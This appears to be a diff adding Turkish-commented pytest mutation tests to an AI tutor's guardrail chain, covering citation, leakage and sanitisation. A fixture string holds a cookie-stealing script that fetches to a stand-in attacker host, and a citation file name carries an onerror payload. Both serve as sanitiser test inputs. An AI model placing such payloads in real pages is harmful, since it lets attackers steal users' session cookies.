@@ -17,6 +17,7 @@ from __future__ import annotations
 import json
 import re
 from pathlib import Path
+from typing import Any
 from uuid import UUID, uuid4
 
 import pytest
@@ -607,3 +608,251 @@ class TestSizintiVakalari:
             assert not outcome.blocked, f"{case['id']}: meşru ipucu bloklandı"
         else:
             assert outcome.blocked, f"{case['id']}: sızıntı yakalanmadı"
+
+
+# ---------------------------------------------------------------------------
+# Mutasyon kanıtı — her halka gerçekten bir şey KORUYOR mu (Kusur 5)
+#
+# "Test var" ile "test bir şey kanıtlıyor" ayrı şeylerdir. Bir halkanın testi,
+# ancak o halka devre dışı bırakıldığında kırmızı yanıyorsa o halkayı sınıyordur.
+# Aşağıdaki sınıf bunu tek seferlik bir deney olarak değil, SÜREKLİ koşan bir
+# kontrol olarak kurar: her halka için hem etkisizleştirilmiş hâl (zarar geçer)
+# hem de tam zincir (zarar durur) doğrulanır.
+#
+# Deseni Şerit 5 RLS'te kurdu — politikayı düşür, testin kırmızı yandığını göster.
+# Buradaki fark, düşürmenin testin İÇİNDE olması: kimsenin elle koşması gerekmiyor.
+# ---------------------------------------------------------------------------
+
+
+class _NoOpGuardrail:
+    """Hiçbir şey yapmayan halka — mutasyonun kendisi."""
+
+    def check(self, answer: GeneratedAnswer, retrieved: list[RetrievedChunk]) -> Any:
+        from app.contracts import GuardrailVerdict
+
+        del answer, retrieved
+        return GuardrailVerdict(blocked=False)
+
+
+def _chain_without(ring: type) -> tuple[Any, ...]:
+    """Üretim zincirinin, verilen halkanın yerine no-op konmuş kopyası.
+
+    Halka SİLİNMEZ, DEĞİŞTİRİLİR: silmek zincirin uzunluğunu da değiştirirdi ve
+    "sıra mı bozuldu, halka mı yok" ayrımı kaybolurdu.
+    """
+    from app.modules.guardrails.chain import GUARDRAIL_CHAIN
+
+    return tuple(_NoOpGuardrail() if isinstance(g, ring) else g for g in GUARDRAIL_CHAIN)
+
+
+ZARARLI_KAYNAK_METNI = (
+    "Ders notu: <script>fetch('//saldirgan/'+document.cookie)</script> "
+    "Sorularınız için hoca@dogus.edu.tr adresine yazın."
+)
+
+
+class TestMutasyonKanidi:
+    def test_citation_halkasi_devre_disi_kalinca_uydurma_atif_gecer(self) -> None:
+        from app.modules.guardrails.citation import CitationGuardrail
+
+        gercek = chunk()
+        uydurma = uuid4()
+        answer = answer_with(gercek.chunk_id, uydurma)
+
+        mutant = screen(answer, [gercek], _chain_without(CitationGuardrail))
+        saglam = screen(answer, [gercek])
+
+        assert uydurma in {c.chunk_id for c in mutant.answer.citations}, (
+            "citation halkası kaldırıldı ama uydurma atıf yine düştü — "
+            "başka bir şey aynı işi yapıyor, halka ölçülemiyor"
+        )
+        assert uydurma not in {c.chunk_id for c in saglam.answer.citations}
+
+    def test_citation_halkasi_devre_disi_kalinca_kaynaksiz_cevap_gosterilir(self) -> None:
+        from app.modules.guardrails.citation import CitationGuardrail
+
+        gercek = chunk()
+        answer = answer_with(uuid4())  # tek atıf ve o da uydurma
+
+        mutant = screen(answer, [gercek], _chain_without(CitationGuardrail))
+        saglam = screen(answer, [gercek])
+
+        assert not mutant.blocked
+        assert saglam.blocked
+        assert saglam.block_reason == BLOCK_REASON_NO_VALID_CITATION
+
+    def test_leakage_halkasi_devre_disi_kalinca_kod_sokratik_moda_gecer(self) -> None:
+        from app.modules.guardrails.leakage import LeakageGuardrail
+
+        kaynak = chunk()
+        answer = answer_with(
+            kaynak.chunk_id,
+            text="Çözüm şöyle:\n\n```python\ndef cevap(n):\n    return n * 2\n```",
+            mode=ChatMode.SOCRATIC,
+        )
+
+        mutant = screen(answer, [kaynak], _chain_without(LeakageGuardrail))
+        saglam = screen(answer, [kaynak])
+
+        assert not mutant.blocked, "leakage halkası kaldırıldı ama cevap yine bloklandı"
+        assert saglam.blocked
+        assert saglam.block_reason is not None
+        assert saglam.block_reason.startswith(leakage.REASON_PREFIX)
+
+    def test_sanitize_halkasi_devre_disi_kalinca_script_cevap_metninde_kalir(self) -> None:
+        from app.modules.guardrails.sanitize import SanitizeGuardrail
+
+        kaynak = chunk()
+        answer = answer_with(kaynak.chunk_id, text=f"Materyalden: {ZARARLI_KAYNAK_METNI}")
+
+        mutant = screen(answer, [kaynak], _chain_without(SanitizeGuardrail))
+        saglam = screen(answer, [kaynak])
+
+        assert "<script>" in mutant.answer.text
+        assert "<script>" not in saglam.answer.text
+        assert "hoca@dogus.edu.tr" not in saglam.answer.text
+
+    def test_sanitize_halkasi_devre_disi_kalinca_atif_kartinda_script_kalir(self) -> None:
+        """9 Ağustos'ta bulunan açık: atıf kartı bu halkayı HİÇ görmüyordu.
+
+        Cevap metni tertemiz çıkıyor, kaynak kutusu ders materyalini olduğu gibi
+        taşıyordu. Mutasyon deseni tam olarak bunu yakalamak içindir: koruma
+        varmış gibi görünen ama uygulanmayan bir halka, testi olmayan halkadan
+        daha tehlikelidir.
+        """
+        from app.modules.guardrails.sanitize import SanitizeGuardrail
+
+        kaynak = chunk(text=ZARARLI_KAYNAK_METNI)
+        answer = GeneratedAnswer(
+            status=AnswerStatus.ANSWERED,
+            mode=ChatMode.QA,
+            text="Cevabın kendisi tertemiz.",
+            citations=[
+                Citation(
+                    chunk_id=kaynak.chunk_id,
+                    file_name="<img src=x onerror=alert(1)>.pdf",
+                    location="Sayfa 7",
+                    quote=ZARARLI_KAYNAK_METNI,
+                )
+            ],
+        )
+
+        mutant = screen(answer, [kaynak], _chain_without(SanitizeGuardrail))
+        saglam = screen(answer, [kaynak])
+
+        assert "<script>" in mutant.answer.citations[0].quote
+        assert "onerror" in mutant.answer.citations[0].file_name
+
+        temiz = saglam.answer.citations[0]
+        assert "<script>" not in temiz.quote
+        assert "fetch(" not in temiz.quote
+        assert "hoca@dogus.edu.tr" not in temiz.quote
+        assert "onerror" not in temiz.file_name
+        # Atıf DÜŞMEZ: kimliği ve konumu hâlâ geçerli bir kaynağa işaret ediyor.
+        assert temiz.chunk_id == kaynak.chunk_id
+        assert temiz.location == "Sayfa 7"
+
+    def test_tam_zincirde_uc_zararin_ucu_de_durur(self) -> None:
+        """Pozitif kontrol: mutasyon testleri ancak sağlam hâl geçiyorsa anlamlı."""
+        kaynak = chunk(text=ZARARLI_KAYNAK_METNI)
+        answer = GeneratedAnswer(
+            status=AnswerStatus.ANSWERED,
+            mode=ChatMode.SOCRATIC,
+            text="Kaynağa dön ve tanımı kendi cümlelerinle yaz.",
+            citations=[
+                Citation(
+                    chunk_id=kaynak.chunk_id,
+                    file_name="OS-Hafta3.pdf",
+                    location="Sayfa 7",
+                    quote=ZARARLI_KAYNAK_METNI,
+                ),
+                Citation(
+                    chunk_id=uuid4(),
+                    file_name="Doğrulanmamış kaynak",
+                    location="",
+                    quote="",
+                ),
+            ],
+        )
+
+        sonuc = screen(answer, [kaynak])
+
+        assert not sonuc.blocked
+        assert len(sonuc.answer.citations) == 1
+        assert "<script>" not in sonuc.answer.citations[0].quote
+
+
+# ---------------------------------------------------------------------------
+# Sızıntı kalıpları — aksansız yazım ve cevap anahtarı (Kusur 5)
+# ---------------------------------------------------------------------------
+
+
+class TestAksansizSizinti:
+    @pytest.mark.parametrize(
+        "metin",
+        [
+            "Cozum: 42",
+            "COZUM: n * 2",
+            "Cevap: dort kosul",
+            "Sonuc: deadlock olur",
+            "Yanit: mutex",
+        ],
+    )
+    def test_diyakritiksiz_yazim_da_yakalanir(self, metin: str) -> None:
+        """Model Türkçe çıktıda aksanı düşürebilir; sızıntı imlaya bağlı olamaz."""
+        assert leakage.detect(metin), f"kaçtı: {metin}"
+
+    def test_aksanli_ve_aksansiz_ayni_dedektoru_tetikler(self) -> None:
+        aksanli = {f.detector for f in leakage.detect("Çözüm: 42")}
+        aksansiz = {f.detector for f in leakage.detect("Cozum: 42")}
+        assert aksanli == aksansiz == {leakage.DETECTOR_DIRECT_ANSWER}
+
+
+class TestCevapAnahtariKalibi:
+    @pytest.mark.parametrize(
+        "metin",
+        [
+            "Doğru cevap B'dir.",
+            "Dogru sik C olur.",
+            "DOĞRU SEÇENEK: A",
+            "Cevap anahtarı ektedir.",
+            "cozum anahtari asagida",
+            "The correct answer is D.",
+            "answer key: attached",
+        ],
+    )
+    def test_cevap_anahtari_yakalanir(self, metin: str) -> None:
+        bulgular = {f.detector for f in leakage.detect(metin)}
+        assert leakage.DETECTOR_ANSWER_KEY in bulgular, f"kaçtı: {metin}"
+
+    @pytest.mark.parametrize(
+        "metin",
+        [
+            "Doğru cevaba ulaşmak için önce koşulları listele.",
+            "Doğru yanıtı bulmadan önce hangi kavramın sorulduğunu düşün.",
+            "Bu soruda doğru şıkkı seçmek için tanımı karşılaştırman gerekiyor.",
+        ],
+    )
+    def test_mesru_yonlendirme_bloklanmaz(self, metin: str) -> None:
+        """Geniş bir desen öğrenciyi şablon ipucuna hapsederdi.
+
+        Her turda yeniden üretim tetikleyen bir yanlış pozitif, Sokratik modu
+        sessizce tek bir sabit metne indirger — filtre çalışıyor görünür, ürün
+        çalışmaz.
+        """
+        bulgular = {f.detector for f in leakage.detect(metin)}
+        assert leakage.DETECTOR_ANSWER_KEY not in bulgular, f"yanlış pozitif: {metin}"
+
+    def test_qa_modunda_cevap_anahtari_bloklanmaz(self) -> None:
+        """Filtre yalnız Sokratik ve sınavda çalışır; QA'da materyali açıklamak meşru."""
+        kaynak = chunk()
+        answer = answer_with(kaynak.chunk_id, text="Doğru cevap B'dir.", mode=ChatMode.QA)
+        assert not screen(answer, [kaynak]).blocked
+
+    def test_sinav_modunda_cevap_anahtari_bloklanir(self) -> None:
+        kaynak = chunk()
+        answer = answer_with(kaynak.chunk_id, text="Doğru cevap B'dir.", mode=ChatMode.EXAM)
+        sonuc = screen(answer, [kaynak])
+        assert sonuc.blocked
+        assert sonuc.block_reason is not None
+        assert leakage.DETECTOR_ANSWER_KEY in sonuc.block_reason
